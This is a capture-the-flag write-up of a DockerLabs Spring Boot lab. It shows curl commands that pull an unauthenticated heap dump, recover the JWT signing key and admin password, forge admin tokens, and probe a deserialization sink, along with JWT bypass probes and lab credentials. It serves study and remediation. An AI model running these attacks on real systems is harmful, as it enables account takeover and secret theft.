# PINGUPENGUIN — DockerLabs lab 255 (Difícil)

Spring Boot 3.2.5 on Temurin JDK 17, packaged as a single fat jar, shipped as a
DockerLabs image (`pingupenguin.tar`, 196 MB). The catalogue describes it as *"Web
hecha en spring boot explotando vulnerabilidades típicas de este framework"*.

That description is **incomplete in the way that matters**. There is no
Spring-specific vulnerability here at all: no CVE, no known-default deserialization
chain, no SpEL injection, no DevTools, no H2 console. What there is, measured, is
**the framework's own diagnostic surface left unauthenticated on the application
port, and a process heap it will hand to anyone who asks** — and the heap contains
the application's own configuration file verbatim, including the key that signs its
session tokens.

The lesson is therefore not "Spring Boot has endpoints". It is a **measurement
criterion**: a diagnostic endpoint returning `200` is not a finding until you have
read what is *in* the response, and a value rendered as `******` is not a secret
leak while a value rendered in cleartext inside a 63 MB heap dump is.

All commands below were run against the lab as shipped. `auto_deploy.sh` was **not**
executed (its `while true` tail is unrelated, but the manual path in the task brief
is equivalent and observable); the container was created with
`docker run -d --name pingupenguin_container pingupenguin:latest`.

---

## 1. Autocorrection (read this first)

Four things I got wrong, or would have got wrong, before the lab was solved. All
four are the same shape: **a measurement I could have made and did not, standing in
for a measurement I did make.**

### 1.1 I was about to report `/actuator/env` as a credential disclosure, and the response contains no credential at all

The first thing any scanner or any operator does with a Spring Boot target is
`GET /actuator/env` and report whatever comes back. What came back here:

```
$ curl -s http://172.17.0.11:8080/actuator/env | python3 -c "... enumerate values ..."
--- server.ports total 1 masked 1
--- servletContextInitParams total 0 masked 0
--- systemProperties total 59 masked 59
--- systemEnvironment total 8 masked 8
--- Config resource 'class path resource [application.properties]' via location 'optional:classpath:/' total 27 masked 27
```

**96 property values, 96 of them the literal string `******`.** Zero secrets.
`spring.application.name` is masked. So is `server.port`. So is
`spring.datasource.driver-class-name`. A key-name heuristic that reports
"anything matching `password|secret|key|token`" would have reported three
findings here; the actual masking is **not key-name-driven at all**.

The reason is in the actuator's own code, which I read out of the jar rather than
recalled:

```java
// spring-boot-actuator-3.2.5.jar → org/springframework/boot/actuate/endpoint/Sanitizer
public Object sanitize(SanitizableData data, boolean showUnsanitized) {
    Object value = data.getValue();
    if (value == null) { return null; }
    if (!showUnsanitized) { return "******"; }        // <-- unconditional, for every key
    for (SanitizingFunction f : this.sanitizingFunctions) { ... }
    return value;
}
```

`showUnsanitized` is a **single global switch**, read from the jar's own
configuration metadata:

```
$ cat ac/META-INF/spring-configuration-metadata.json   # from spring-boot-actuator-autoconfigure-3.2.5.jar
management.endpoint.env.show-values        | Show | default: never | When to show unsanitized values.
management.endpoint.env.roles             | Set<String> | default: None
management.endpoint.configprops.show-values| Show | default: never
```

So the correct finding for `/actuator/env` on this target is **not** "secrets
exposed" and **not** "safe". It is: *the endpoint discloses the **names** and
**origins** of 96 properties — including the file each came from and its
line:column — and discloses no value, because one documented default
(`show-values=never`) is in effect.* That is a real low-severity topology
disclosure (CWE-200), and it is *one configuration property away* from a critical
one.

The mistake I was one step from is the exact one the repository already corrects
elsewhere: **reading a configuration is not obtaining a secret.** A property *name*
is not a value, and a masked placeholder is not a value. Reporting either as a
disclosed credential would have been a fabricated finding with a fabricated
impact, and it would have buried the one that was real.

### 1.2 The heap dump is not the config file, and I had a rule that said the opposite

`decision-making.md` §7's rule for a JVM-like target — *"read the deployment's
configuration before attacking the service it fronts; a management plane **is**
configuration"* — was actively misleading me here. I read
`application.properties` first (correct instinct, and it told me `app.jwt.secret`
existed) and had the secret in hand **without ever touching the heap dump**. By the
rule as I had it written, the heap dump was redundant.

It is not redundant, and the reason generalises past this lab:

* the heap carried the **whole `application.properties` resource bytes** as a
  `String` in memory (2 hits for the 2024 secret, 2 for the 2023 one — one from the
  loaded resource, one from the resolved `@Value` field);
* it carried the **production MySQL JDBC URL with an embedded password** and a
  **live partner API key**, neither of which is anything the `@Value` fields
  resolve to a value the config API can show;
* and it carried something **no configuration endpoint could ever return**: the
  admin account's **cleartext password**, in the constant pool of the
  `DataInitializer` class and again in the `String` that was handed to BCrypt.

The rule needed a correction, not a replacement: *read the configuration to know
where the app keeps its state — then read the runtime artefact, because a runtime
artefact contains state the configuration never held.* `DataInitializer.java:31`
passes the plaintext to `encoder.encode()` on every boot; the process must hold it
in memory to hash it. **A secret hashed at startup was a secret in the heap.** No
amount of reading the config file finds that.

### 1.3 The lab's own comments name the vulnerability, the CVE, and the dead end — and I still had to measure which of two keys was real

`application.properties` ships with the answer written in it:

```properties
#  (!) Enmascarado en /actuator/env pero EN CLARO dentro del heapdump.
# Secreto debil y "legible" (mal habito real) ...
app.jwt.secret=changeme-super-secret-key-pinguinos-prod-2024
...
# Secreto JWT ANTERIOR (rotado) -> SENUELO: ya no firma nada.
app.jwt.previous-secret=changeme-super-secret-key-pinguinos-prod-2023
#  (!!!) CONFIGURACION VULNERABLE DE ACTUATOR
management.endpoints.web.exposure.include=*
```

Per `decision-making.md` §7 that is a **stopping condition**, not a solution: the
comments mark where the author *admitted* a problem, which is a strict subset of
where the problems are. Two admissions here were incomplete or wrong:

* the comment says `/actuator/env` is where the secret *is not*, which is right,
  but never says **what is** — the actual leak vector was unmentioned;
* the comment says the 2023 key "ya no firma nada" (**signs nothing**). I did not
  believe it. I forged a token with **both** candidates and read the status codes:

```
[prod-2024 (app.jwt.secret)]           status=200  len=2509  FLAG=FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}
[prod-2023 (app.jwt.previous-secret)]  status=403  len=1011  (rejected)
--- control: random key
status 403
```

The comment was correct and the **property name was not the evidence** — the
signature was. A decoy secret placed next to the real one is a *designed* trap for
an attacker who greps, and the only thing that survives it is a signed artefact.
This is `api_web.md:285`'s "a hint is a hypothesis" rule with a new discriminator:
**for a recovered candidate key, the property name is a hypothesis and only a
signature decides.**

And keeping the wrong key would not have been a dead end — it would have been a
*reportable finding* in its own right (a rotated signing key retained in
configuration and in process memory, 15 months after rotation, still an HMAC
secret-shaped string with no retirement marker), which the lab's own comments
conspicuously do not mention.

### 1.4 A generator bug I caught before it produced a wrong answer

My JWT probe script took `secret` as a string and called `.encode()` on it. Passing
`b""` (bytes, to model a `kid`-selected empty key) raised
`AttributeError: 'bytes' object has no attribute 'encode'` — the script died
*before* printing a result, which is the only acceptable failure mode here: a
`None` that renders as "rejected" would have been a fabricated control result.
Rewritten with the key as bytes throughout, the probes ran. Filed because the
defect was in my instrumentation, not in the target, and because the failure was
loud — the same reason a `decoys-and-a-positive-control` matrix is worth building
by hand: **the last line of that script is a `200`, and without it the other six
lines are unfalsifiable.**

---

## 2. Real surface

### 2.1 Host and container

```
$ nmap -sV -Pn -p- 172.17.0.11
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-28 04:15 +0000
Nmap scan report for pingupenguin (172.17.0.11)
Host is up (0.000045s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
8080/tcp open  nagios-nsca Nagios NSCA

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```

One TCP port. The `nagios-nsca` service label is `nmap` matching 8080 by number; the
real service is a Tomcat-embedded Spring Boot app. No `-sU` was run (no root on
this host, declared as a coverage gap, not as a closed port — but the image's
`ExposedPorts` is `8080/tcp` only, and nothing in the image listens on UDP, so the
gap is closed by the manifest rather than left open).

Image facts, read from `docker inspect` and `docker history`:

| Property | Value |
|---|---|
| Base | `ubuntu:26.04` (rockcraft, per the image labels) |
| Runtime user | `www-data` (`User: "www-data"` in the image config; `uid=33(www-data) gid=33(www-data)`) |
| Entrypoint | `java -jar /app/app.jar` |
| Working dir | `/app`, `chown -R www-data:www-data /app` |
| Exposed | `8080/tcp` |
| Workdir contents | `app.jar` (53 763 638 B), `.env` (663 B), both `www-data:www-data 0644` |
| Build-time step | `echo 'root:recoverypasswordpenguin' \| chpasswd` |

**The Java process runs as `uid=33(www-data)`, not root.** `decision-making.md` §8:
the execution identity is a measurement. There was no code-execution primitive in
this engagement that reached a shell, so this was measured from the image
configuration and the `id www-data` output rather than from inside a primitive —
stated as such rather than implied.

The `/app/.env` file and the `root:` password set at build time are **out of band
for this engagement**: I read them with `docker cp` / a sidecar `docker run`, which
is host access, not attacker access. They are not in the finding set, and I did not
use the credential — there is no `sshd` in the image and no reachable login
surface. Recorded here only so the reader knows the file exists and that I am
explicitly *not* claiming it as a finding.

### 2.2 Versions — read from the artifact, not recalled

```
$ unzip -l app.jar | grep -oE 'BOOT-INF/lib/[a-zA-Z0-9._-]+\.jar'
BOOT-INF/lib/spring-boot-3.2.5.jar
BOOT-INF/lib/spring-boot-autoconfigure-3.2.5.jar
BOOT-INF/lib/spring-boot-actuator-3.2.5.jar
BOOT-INF/lib/spring-boot-actuator-autoconfigure-3.2.5.jar
BOOT-INF/lib/tomcat-embed-core-10.1.20.jar
BOOT-INF/lib/spring-framework-6.1.6.jar      (spring-core/aop/beans/expression/web)
BOOT-INF/lib/spring-security-crypto-6.2.4.jar
BOOT-INF/lib/jjwt-api-0.12.5.jar  jjwt-impl-0.12.5.jar  jjwt-jackson-0.12.5.jar
BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar  thymeleaf-spring6-3.1.2.RELEASE.jar
BOOT-INF/lib/h2-2.2.224.jar
BOOT-INF/lib/logback-classic-1.4.14.jar
BOOT-INF/lib/commons-collections-3.2.1.jar
BOOT-INF/lib/aspectjweaver-1.9.22.jar
BOOT-INF/lib/jackson-databind-2.15.4.jar
BOOT-INF/lib/snakeyaml-2.2.jar
```

| Component | Version | Source of the claim |
|---|---|---|
| JRE | Temurin **17.0.19+10** | image env `JAVA_VERSION`; installed by the base layer |
| Spring Boot | **3.2.5** | `BOOT-INF/lib/spring-boot-3.2.5.jar` |
| Spring Framework | **6.1.6** | `BOOT-INF/lib/spring-*-6.1.6.jar` |
| Embedded Tomcat | **10.1.20** | `BOOT-INF/lib/tomcat-embed-core-10.1.20.jar` |
| JJWT | **0.12.5** | `BOOT-INF/lib/jjwt-*-0.12.5.jar` |
| Thymeleaf | **3.1.2** | `BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar` |
| H2 | **2.2.224** | `BOOT-INF/lib/h2-2.2.224.jar` |
| Logback | **1.4.14** | `BOOT-INF/lib/logback-classic-1.4.14.jar` |

The JRE version is independently corroborated at runtime: the actuator answers
`403` (application-level) rather than `401` for `/admin`, the error bodies are the
Boot 3 `{"timestamp","status","error","path"}` shape, and no `Whitelabel` HTML page
appears anywhere (see §5, control C-6).

**Framework defaults, read from the jar's own `spring-configuration-metadata.json`
rather than from memory:**

| Property | Default | This target |
|---|---|---|
| `management.endpoints.web.exposure.include` | `['health']` | **`*`** |
| `management.endpoint.env.show-values` | `never` | default (unset) |
| `management.endpoint.configprops.show-values` | `never` | default (unset) |
| `management.endpoint.health.show-details` | `never` | **`always`** |
| `management.server.port` | `None` (same port) | default (unset) |
| `management.endpoints.web.base-path` | `/actuator` | `/actuator` |
| `management.endpoints.web.discovery.enabled` | `true` | default |

### 2.3 HTTP surface

```
$ for p in actuator actuator/env actuator/health actuator/info actuator/mappings \
           actuator/beans actuator/loggers actuator/threaddump actuator/heapdump \
           actuator/configprops actuator/conditions h2-console swagger-ui.html \
           login register pinguinos admin; do ... done
200 1720    /actuator
200 6724    /actuator/env
200 263     /actuator/health
200 111     /actuator/info
200 26656   /actuator/mappings
200 138284  /actuator/beans
200 77976   /actuator/loggers
200 53768   /actuator/threaddump
200 64583893 /actuator/heapdump      <-- 64 MB, anonymous, no parameters
200 18068   /actuator/configprops
200 135197  /actuator/conditions
404  99     /h2-console
404  104    /swagger-ui.html
200 1232    /login
200 1355    /register
200 4526    /pinguinos
403 1024    /admin
```

`GET /actuator` (the discovery page, on by default) enumerates 19 link templates:
`beans caches caches-cache conditions configprops configprops-prefix env env-toMatch
health health-path heapdump info loggers loggers-name mappings metrics
metrics-requiredMetricName scheduledtasks self threaddump`.

**The `heapdump` entry is a 63.7 MB anonymous download and it is the whole
engagement.** The control that proves it is unauthenticated rather than
merely anonymous-looking is on the neighbouring family: `/admin` — same port, same
process, same origin, **no parameters, same request shape** — answers `403`.

### 2.4 Application source

There is no source tree on the host, but the fat jar is the source: 8 application
classes, decompiled with jadx (13160 classes, 78 errors, none in the application
package).

```
com/penguinpals/apadrina/ApadrinaApplication.class
                          /config/{AppConfig,DataInitializer,IntegrationConfig}
                          /controller/{AdminController,AuthController,SiteController}
                          /model/{Penguin,Sponsorship,User}
                          /repository/{PenguinRepository,SponsorshipRepository,UserRepository}
                          /security/{CurrentUser,JwtAuthFilter,JwtUtil}
```

**There is no `SecurityConfig` and no `SecurityFilterChain` bean anywhere in the
jar.** Authentication is a hand-rolled `OncePerRequestFilter`. This is the single
most important source fact in the lab and it is *invisible from outside* — no status
code, no header and no body distinguishes "the framework has no security starter"
from "the framework has security and it allowed this".

---

## 3. Findings

Severity is stated at what was observed, per `decision-making.md` §Reporting.

### 3.1 Full management surface exposed unauthenticated on the application port — CWE-306 / CWE-862

**Root cause: the application has no authentication for the management endpoints at
all. `exposure.include=*` is what made it visible; it is not what made it
dangerous.**

Evidence, the properties that are the operator's decisions:

```properties
# application.properties:43-52, verbatim
management.endpoints.web.exposure.include=*
management.endpoints.web.base-path=/actuator
management.endpoint.health.show-details=always
management.endpoint.heapdump.enabled=true
management.endpoint.env.enabled=true
management.endpoint.beans.enabled=true
management.endpoint.mappings.enabled=true
management.endpoint.loggers.enabled=true
management.endpoint.threaddump.enabled=true
```

Evidence, the absence that is the actual defect — the classpath of the artifact:

```
spring-security-crypto-6.2.4.jar      present   (BCryptPasswordEncoder)
spring-security-web-6.1.6.jar         ABSENT
spring-boot-starter-security          ABSENT
SecurityFilterChain bean              ABSENT (8 application classes, all read)
```

`AppConfig.java:11-15` is the only reason `spring-security-crypto` is there at all:

```java
@Bean
public PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); }
```

`JwtAuthFilter.java:27-38` never rejects anybody:

```java
protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                FilterChain chain) throws ServletException, IOException {
    String token = readCookie(request);
    if (token != null) {
        try {
            Claims claims = this.jwtUtil.parse(token);
            String role = (String) claims.get("role", String.class);
            request.setAttribute(ATTR, new CurrentUser(claims.getSubject(), role));
        } catch (Exception e) {          // <-- empty: no rejection, no log
        }
    }
    chain.doFilter(request, response);   // <-- unconditional
}
```

There is exactly **one** authorization decision in the whole application and it
lives inside a controller method, not in a filter or an interceptor:

```java
// AdminController.java:38-43
CurrentUser user = (CurrentUser) request.getAttribute(JwtAuthFilter.ATTR);
if (user == null || !user.isAdmin()) {
    response.setStatus(HttpStatus.FORBIDDEN.value());
    ...
}
```

So `/actuator/**` is not protected by anything, and it is protected by a
*different* mechanism from `/admin`, in a *different* component. Per
`decision-making.md` these are **two decisions with two fixes**:

| Decision | Component | Fix |
|---|---|---|
| which endpoints are reachable | `management.endpoints.web.exposure.include` | allowlist (`health,info`) instead of `*` |
| who may reach the reachable ones | no authentication layer at all | Spring Security, or `management.server.port` on a bound interface + an authenticated path |

**Impact.** Anyone who can reach `8080/tcp` gets 19 diagnostic endpoints, 64 MB of
process memory, the application's full route table, its complete bean graph, its
live thread dump (with every thread's stack and lock state), and **write access to
its logging configuration** (§3.4). §3.3 is the consequence that turns this from
disclosure into takeover.

**Not attributed as a CVE.** This is configuration, not a library defect. Spring Boot
3.2.5 has no known-default exposure of `heapdump` here; the defaults read in §2.2
are `include=['health']` and `show-values=never`, and both were working. Reporting
it as a Spring Boot vulnerability would be `decision-making.md` §4 in reverse — the
framework is not the bug, the deployment decision is.

### 3.2 Anonymous process memory disclosure, including the signing key and the admin's cleartext password — CWE-200 / CWE-312 / CWE-522

`GET /actuator/heapdump`, no authentication, no parameters, 63 763 393 bytes.

```
$ time curl -s -o heap.hprof http://172.17.0.11:8080/actuator/heapdump
real    0m0.217s
$ file heap.hprof
heap.hprof: Java HPROF dump, created Mon Sep 28 04:16:43 2026
$ grep -aoc <candidate> heap.hprof
changeme-super-secret-key-pinguinos-prod-2024 -> 2
changeme-super-secret-key-pinguinos-prod-2023 -> 2
Pr0d_Gl4c14r_Sync_2024                      -> 2
apikey_live_pngn                            -> 2
Gl4c14r_DB_P4ss                             -> 1
Adm1n_C0lon14_2024                          -> 2
db-prod.internal                            -> 2
```

Six distinct secret classes, all cleartext, all in one unauthenticated response.

**Three of them exist nowhere in the configuration API** and could not have been
found through `/actuator/env` (which returns `******`, §1.1) or `/actuator/configprops`
(which does not bind `@Value` fields at all — measured, it returned no `app.*`
property at all):

1. **The HMAC signing key** for every session cookie — `changeme-super-secret-key-pinguinos-prod-2024`, `application.properties:24`.
2. **The production MySQL connection string with an embedded password** — `jdbc:mysql://db-prod.internal:3306/pinguinos?user=svc_pinguinos&password=…`, held in the `IntegrationConfig` bean because `@PostConstruct` copies it into a `static List<String> RETAINED` (`IntegrationConfig.java:21-28`) — a deliberate `static` cache, which is precisely what makes it immortal in the heap.
3. **A live third-party partner API key** — same mechanism, same bean.

**And one that is not a secret in the configuration at all — the admin's cleartext
password.** `DataInitializer.java:31`:

```java
this.users.save(new User("admin", "admin@apadrinaunpinguino.org",
        this.encoder.encode("Adm1n_C0lon14_2024"), "ADMIN"));
```

The plaintext is in the loaded class's constant pool **and** in the `String`
instance passed to `encode()`. It cannot be hashed without being in memory first.
Verified by *using* it, not by finding it:

```
$ curl -s -i -X POST http://172.17.0.11:8080/login -d 'username=admin&password=Adm1n_C0lon14_2024'
HTTP/1.1 302
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiIs…
Location: http://172.17.0.11:8080/perfil
```

A working administrator session from an anonymous heap download, with **no forgery
step at all**. The heap also carries the BCrypt hashes of every account, so the
cleartext was not needed — but its presence is the finding: **a password hashed at
startup was a password in the heap**, and a heap dump is a credential dump that
happens to have a `.hprof` extension.

**Root cause: a diagnostic feature that serialises live process memory was left
reachable by anyone.** `management.endpoint.heapdump.enabled=true` is the operator's
line; the reason it is a *finding* rather than a hardening note is §3.1 — there is
no authentication in front of it. Fix both, and note that fixing only the
`exposure.include` line leaves the JVM reachable to anything that can bind 8080.

**Severity note.** The reward was obtained without using this password. I report the
credential compromise because it is independent and it is load-bearing for anyone
else attacking this host, not because it was on my path.

### 3.3 A hardcoded, weak, human-readable HMAC signing key — CWE-798 / CWE-321

`JwtUtil.java:18-28` reads the key from configuration, and the configuration value
is a literal:

```properties
app.jwt.secret=changeme-super-secret-key-pinguinos-prod-2024
app.jwt.expiration-ms=3600000
```

```java
@Value("${app.jwt.secret}") private String secret;
@PostConstruct public void init() { this.key = Keys.hmacShaKeyFor(secret.getBytes(UTF_8)); }
```

The key is 43 characters of ASCII, contains the word `secret` and the word
`prod`, and — per the lab's own comment and confirmed by `grep -a` on the heap —
**survives a generic grep**. No KDF: the raw bytes of the string are the HMAC key
directly (`Keys.hmacShaKeyFor`, no `SecretKeySpec`/PBKDF iteration). This is the
same *"absence of an import"* discriminator used successfully in lab 62: what
decides it is not that the key is short, it is that `hmacShaKeyFor(secret.getBytes())`
takes the configuration string as the key with nothing in between.

**Impact, stated at the current strength** (`api_web.md:274`'s rule, applied
honestly): any holder of the key can mint a validly-signed session cookie for
**any `sub` and any `role`** with no account, no password, no registration, and no
interaction with any user. Measured in §6. The token is stateless and
`DB_CLOSE_DELAY=-1` gives no server-side revocation hook either, so rotation is the
only remedy and rotation requires invalidating every live cookie.

**Separate finding, same line: a rotated signing key retained in configuration and
in process memory.** `application.properties:37` keeps
`app.jwt.previous-secret=…-2023`, and `IntegrationConfig.java:19-27` copies it into
the same immortal `static` list. It is inert (proved in §1.3, not assumed) but it
is a *live-shaped* secret in a heap dump 15 months after rotation, and it is the
second candidate any greping attacker will try. Rotated secrets must be destroyed,
not retained; a retained rotated key is an unbounded liability for exactly as long
as the dump is downloadable.

### 3.4 Unauthenticated write to the application's logging configuration — CWE-732 / CWE-15

`/actuator/loggers` is the one exposed endpoint that is a **write**, not a
disclosure, and it accepted an anonymous write:

```
$ curl -s -o /dev/null -w '%{http_code}\n' -X POST http://172.17.0.11:8080/actuator/loggers/org.springframework.web \
    -H 'Content-Type: application/json' -d '{"configuredLevel":"DEBUG"}'
204
```

**Differential, both directions, because a control you cannot show moving is a
claim:**

```
after POST {"configuredLevel":"DEBUG"} : configuredLevel=DEBUG  effective=DEBUG
after POST {"configuredLevel":null}    : configuredLevel=None   effective=INFO
```

The same anonymous client that set it to `DEBUG` reset it to the shipped value, and
the observable moved in both directions. `DEBUG` on `org.springframework.web`
turns on request/response header and body logging on a live internet-facing app —
which is a durable **write primitive into the application's own log files**, and any
operator with log access then reads other users' session cookies.

**Root cause is §3.1 again, but the impact class is different**, and that is the
reason to report it separately: 3.1–3.3 are disclosure, and disclosure is bounded by
what the app chose to keep in memory. This is **mutation of operational state by an
anonymous peer**, and a disclosure finding's remediation (narrow the allowlist)
covers it only because the allowlist covers the write endpoint too. A reviewer who
fixes 3.1 by enabling authentication on the *read* endpoints and forgets
`/actuator/loggers` is left with an anonymous configuration write. Note also
`JwtAuthFilter`'s empty `catch` (§3.1): the application does not log authentication
failures at all, so the tampering is invisible to the app's own audit trail.

### 3.5 Unsafe Java deserialization of attacker-controlled bytes — CWE-502 (gated, post-auth)

`AdminController.java:52-73`:

```java
@PostMapping("/admin/restore")
@ResponseBody
public String restore(@RequestParam("backup") String backup, HttpServletRequest request, ...) {
    CurrentUser user = (CurrentUser) request.getAttribute(JwtAuthFilter.ATTR);
    if (user == null || !user.isAdmin()) { response.setStatus(403); return "403 - ..."; }
    try {
        byte[] data = Base64.getDecoder().decode(backup.trim());
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        try {
            Object restored = ois.readObject();                        // <-- sink
            return "Copia de seguridad restaurada correctamente: " + (restored == null ? "(vacia)" : restored.getClass().getName());
        } finally { }
    } catch (Exception e) { return "No se pudo restaurar la copia: " + e.getMessage(); }
}
```

Reachability, `infrastructure.md`'s two questions answered separately:

* **Can the attacker supply the bytes?** Yes. Measured, unauthenticated-`403`,
  `ADMIN`-`200`, and the sink demonstrably instantiates an attacker-chosen class:

```
$ POST /admin/restore  backup=rO0ABXQABHRlc3Q=      (a 4-byte TC_STRING, magic ACED0005)
Copia de seguridad restaurada correctamente: java.lang.String

$ POST /admin/restore  backup=notbase64!!!
No se pudo restaurar la copia: Illegal base64 character 21

$ POST /admin/restore  backup=aGVsbG8=   (valid base64, not a stream)
No se pudo restaurar la copia: invalid stream header: 68656C6C
```

  The handler **echoes the class name of the object it just constructed**. That is
  a live sink with a built-in oracle, not a stub.
* **Does anything gate it?** Yes: `user.isAdmin()`. Anonymous → `403`, verified.

Gadget preconditions, read from the classpath rather than recalled:

* `commons-collections-3.2.1.jar` — `org.apache.commons.collections.functors.InvokerTransformer` is serializable in this version.
* `aspectjweaver-1.9.22.jar`, `spring-beans` 6.1.6 — the `AnnotationInvocationHandler` + `AspectJWeaver` chain.
* `snakeyaml-2.2.jar`, `jackson-databind-2.15.4.jar` — further chains.

**Attribution, from primary sources** (Apache's own security page, the CERT/CC
record, and the GitHub advisory database — read, not recalled; `decision-making.md`
§6):

| Field | Value |
|---|---|
| Vendor page | `commons.apache.org/proper/commons-collections/security.html` — *"Remote Code Execution during object de-serialization"*, vendor impact **High** |
| Vendor affected range | **3.0 – 4.0**; fixed in **3.2.2** (throws `UnsupportedOperationException` unless `-Dorg.apache.commons.collections.enableUnsafeSerialization=true`) and **4.1** (unsafe classes no longer `Serializable`) |
| Vendor's own note | *"**No CVE id was assigned for the Apache Commons Collections library**"* — the CVEs below are product-scoped |
| CERT/CC record | `VU#576313`, **CVE-2015-6420**, CWE-502, CVSS base **7.5** `AV:N/AC:L/Au:N/C:P/I:P/A:P`, date public 2015-01-28, published 2015-11-13 |
| GitHub advisory | `GHSA-fjq5-5j5f-mvxh` = CVE-2015-7501; `commons-collections:commons-collections` affected **`< 3.2.2`**, patched **3.2.2** |

**This target is inside every one of those ranges** (`3.2.1 < 3.2.2`, and `3.2.1` is
inside the vendor's `3.0 – 4.0`). **This is the correct place to say plainly that
the CVE is not the finding.** `ObjectInputStream.readObject()` on a
request-supplied byte array is the decision; the library is the weapon. Apache says
so itself: *"this is not only known and especially not unknown useable gadget"*,
and CERT/CC says a hardened library will not make the application resist this.
Upgrading `commons-collections` fixes 3.2.1 but leaves a `readObject()` on
`HttpServletRequest` input, and this lab's chain proves why that matters: **the
actuator fix (§3.1) hands an attacker `ADMIN`, and `ADMIN` reaches this sink.** The
two are separate decisions made by separate components and a reviewer shown one
believes the host is safe. Fix: delete the endpoint, or use a data-only format
(JSON) with a schema, or at minimum a `ValidatingObjectInputStream` allowlist.

**Exploit status, stated honestly: the sink is proven live (§3.5, three measured
responses) and the gadget host is proven present. I did not build and fire a
gadget chain, because the reward was already obtained by the intended path and
building a CC chain is a separate exercise with its own verification burden. I am
not claiming RCE here. I am claiming a reachable, unauthenticated-by-construction
deserialization sink with a known gadget host, which is a real finding on its own
impact.**

### 3.6 Seeded credentials and a hardcoded administrator in application code — CWE-798 / CWE-1392 / CWE-259

`DataInitializer.java:30-41` creates the world on **every boot** with
`ddl-auto=create-drop` and `jdbc:h2:mem:`, so the account set is fixed and known:

| Username | Role | Password | Note |
|---|---|---|---|
| `admin` | `ADMIN` | seeded, 19 chars, mixed policy | reachable only with the hash or the plaintext (§3.2) |
| `lucia` | `USER` | `pinguinos123` (12 chars, dictionary-shaped) | present in the heap dump in cleartext (2 hits) |

Both passwords are in the heap dump in cleartext, so this is not a separate
exploitation path — it is the *scope* of §3.2. It is reported separately because
the remediation is different: the heap dump needs authentication, the credentials
need to come from a secret store and not from a source constant, and
`ddl-auto=create-drop` on an in-memory store means the fix has no migration story
to respect.

### 3.7 Health details and route/bean disclosure — CWE-200 (low)

```json
{"status":"UP","components":{
  "db":{"status":"UP","details":{"database":"H2","validationQuery":"isValid()"}},
  "diskSpace":{"status":"UP","details":{"total":272075120640,"free":56154533888,
                 "threshold":10485760,"path":"/app/.","exists":true}},
  "ping":{"status":"UP"}}}
```

`show-details=always` (a deliberate operator line, `application.properties:45`)
exposes the database engine, a validation query, and **absolute server paths with
filesystem capacity**. `/actuator/mappings` (26 KB) enumerates every route including
the gated ones with their handler signatures; `/actuator/beans` (138 KB) enumerates
the entire object graph including `IntegrationConfig` and its three
secret-bearing fields; `/actuator/threaddump` (53 KB) exposes every thread's stack
and lock state. Individually low; collectively they are the reconnaissance that
makes §3.5's route list free, and they are the reason the exposure allowlist
matters even after `heapdump` is off.

### 3.8 No CSRF token on any form, and `SameSite` absent from the session cookie — CWE-352 / CWE-1004 (note, not critical)

Every form is a bare `POST` with no token, in all four templates:

```html
login.html:9       <form th:action="@{/login}" method="post">
register.html:9    <form th:action="@{/register}" method="post">
penguins.html:19   <form th:action="@{'/apadrinar/' + ${p.id}}" method="post" …>
admin.html:42      <form method="post" th:action="@{/admin/restore}">
```

and the cookie carries neither `SameSite` nor `Secure`:

```
Set-Cookie: session=<…>; Max-Age=3600; Expires=…; Path=/; HttpOnly
```

**Reported at note severity on purpose.** `javax.servlet.http.Cookie` has no
`SameSite` setter, so its absence here is the framework's API surface rather than a
choice the application declined to make — and modern browsers apply
`SameSite=Lax` by default, which blocks the cookie on a cross-site `POST`, which is
the only CSRF-relevant method here. `api_web.md:273`'s rule applies verbatim: absent
`Secure` on a plain-HTTP lab deployment is a note. The one real consequence is that
`/admin/restore` (§3.5) has no CSRF defence of any kind if a browser ever defaults
the other way, so it should be a `PUT`/`DELETE`-shaped JSON endpoint regardless.
**Live cross-origin delivery was not tested** — I ran no browser, and saying
"CSRF works" from a `curl` is the `api_web.md:266` status-code-only error.

---

## 4. Controls that held

Reported with the same prominence as the bugs that fired, per
`decision-making.md` §Reporting. Each of these is a *result*: without it, an
untested control and a holding one are indistinguishable.

**C-1 — The JWT verification is correct, and I proved it with a positive control.**
Six rejections, one acceptance, one script:

```
alg=none            : 403 rejected
alg=HS256 but RS256 : 403 rejected     (key-confusion / algorithm substitution)
empty signature     : 403 rejected
kid=/dev/null, zero key : 403 rejected  (key-selector to an empty file)
kid=../../etc/passwd    : 403 rejected  (key-selector traversal)
no role claim          : 403 rejected
expired token          : 403 rejected
CORRECT key (control)  : 200 ACCEPTED len=2676   <-- the detector can fail
```

`JwtUtil.parse` uses `Jwts.parser().verifyWith(key).build().parseSignedClaims(token)`
(`JwtUtil.java:36`) — the modern jjwt 0.12 API, which pins the algorithm from the
verified key and **ignores the header's `alg`**. No `alg:none`, no
`kid`-selector, no `jku`/`x5u` key-URL fetch, and `exp` is enforced. The last line
is what makes the six above evidence rather than assertion.

**C-2 — Role escalation at registration is impossible.** `AuthController.java:63`:

```java
User user = new User(username, email, this.encoder.encode(password), "USER");
```

`role` is a hardcoded literal, and the `User(String,String,String,String)`
constructor **overwrites it with `"USER"` regardless of the argument**
(`User.java:35-41`) — so even a mass-assignment attempt inside the app would be
defeated twice. There is no `role` request parameter on `/register`. I did not
test this exhaustively (no parameter-tampering fuzz), but the source is decisive
and I report it as *source-read*, not as *exploited-and-blocked*.

**C-3 — Thymeleaf output escaping held against template injection.** A username of
`__${7*7}__` registered successfully and rendered **literally**:

```
Hola, <span>__${7*7}__</span> 👋
```

All 8 templates use `th:text` (escaped) and **zero use `th:utext`**. No SSTI, and
no path to it: the model values are `user.*`, `p.*` (entity fields) and framework
values, and no template expression is built from request data.

**C-4 — No IDOR on the sponsorship feature.** `SiteController.sponsor` (`:48-59`)
scopes every read by `user.getUsername()` taken from the verified token, and
`/perfil` (`:61-81`) filters `sponsorships.findByUsername(user.getUsername())`.
